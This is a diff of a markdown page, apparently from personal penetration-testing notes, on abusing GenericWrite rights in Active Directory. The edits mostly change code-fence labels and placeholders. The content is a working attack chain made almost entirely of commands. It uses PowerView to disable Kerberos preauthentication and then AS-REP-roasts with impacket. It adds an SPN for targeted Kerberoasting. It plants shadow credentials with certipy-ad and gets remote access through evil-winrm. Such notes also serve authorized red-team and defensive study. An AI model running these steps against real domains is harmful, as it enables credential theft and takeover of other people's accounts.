@@ -4,7 +4,6 @@ date: 2024-7-13
 tags: ["GenericWrite", "active driectory", "ad", "Windows"]
 ---
 
----
 ### Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user
 
 {{< tab set1 tab1 active >}}Windows{{< /tab >}}
@@ -14,7 +13,7 @@ tags: ["GenericWrite", "active driectory", "ad", "Windows"]
 
 <div>
 
-```powershell
+```console
 . .\PowerView.ps1
 ```
 
@@ -24,7 +23,7 @@ tags: ["GenericWrite", "active driectory", "ad", "Windows"]
 
 <div>
 
-```powershell
+```console
 Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue
 ```
 
@@ -34,7 +33,7 @@ Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue
 
 <div>
 
-```powershell
+```console
 Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
@@ -44,9 +43,9 @@ Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Ver
 
 <div>
 
-```bash
+```console
 # In local linux machine
-impacket-GetNPUsers <DOMAIN>/<USER> -no-pass -dc-ip <DC>
+impacket-GetNPUsers '<DOMAIN>/<USER>' -no-pass -dc-ip <DC>
 ```
 
 </div>
@@ -66,7 +65,7 @@ impacket-GetNPUsers <DOMAIN>/<USER> -no-pass -dc-ip <DC>
 
 <div>
 
-```powershell
+```console
 . .\PowerView.ps1
 ```
 
@@ -76,15 +75,15 @@ impacket-GetNPUsers <DOMAIN>/<USER> -no-pass -dc-ip <DC>
 
 <div>
 
-```powershell
-$username = "<DOMAIN>\<USER>"
+```console
+$username = '<DOMAIN>\<USER>'
 ```
 
-```powershell
+```console
 $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
 ```
 
-```powershell
+```console
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
@@ -94,12 +93,12 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 
 <div>
 
-```powershell
+```console
 # Add spn (e.g. MSSQL)
-setspn -a MSSQLSvc/example.com:1433 <DOMAIN>\<TARGET_USER>
+setspn -a MSSQLSvc/<TARGET_DOMAIN>:1433 <DOMAIN>\<TARGET_USER>
 ```
 
-```powershell
+```console
 # Check
 Get-DomainUser <TARGET_USER> | Select serviceprincipalname
 ```
@@ -110,8 +109,8 @@ Get-DomainUser <TARGET_USER> | Select serviceprincipalname
 
 <div>
 
-```powershell
-Get-DomainSPNTicket -SPN "MSSQLSvc/example.com:1433" -Credential $Cred
+```console
+Get-DomainSPNTicket -SPN "MSSQLSvc/<DOMAIN>:1433" -Credential $Cred
 ```
 
 </div>
@@ -129,27 +128,27 @@ Get-DomainSPNTicket -SPN "MSSQLSvc/example.com:1433" -Credential $Cred
 
 <div>
 
-```bash
+```console
 # Request a ticket
 kinit <USER>
 ```
 
-```bash
+```console
 # Import ticket
 export KRB5CCNAME=/tmp/krb5cc_1000
 ```
 
-```bash
+```console
 # Pre-check (Optional)
 certipy-ad find -username <USER>@<DOMAIN> -k -target <TARGET_DOMAIN>
 ```
 
-```bash
+```console
 # Add shadow credentials
 certipy-ad shadow auto -username <USER>@<DOMAIN> -account <TARGET_USER> -k -target <TARGET_DOMAIN>
 ```
 
-```bash
+```console
 # Remote with kerberos
 KRB5CCNAME=./<TARGET_USER>.ccache evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
 ```
